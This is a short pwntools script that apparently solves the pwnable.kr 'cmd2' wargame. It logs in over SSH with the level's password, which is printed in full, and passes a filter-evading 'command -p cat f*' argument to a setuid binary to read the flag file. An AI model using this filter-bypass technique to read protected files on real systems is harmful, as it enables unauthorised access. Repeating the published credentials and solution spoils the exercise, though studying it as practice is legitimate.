from pwn import *

s = ssh(host='pwnable.kr', port=2222, user='cmd2', password='mommy now I get what PATH environment is for :)')
p = s.process(["./cmd2", "command -p cat f*"])

#Need to receive 2 lines since 'command' echoes the command to stdout
print(p.recvline())
print(p.recvline())
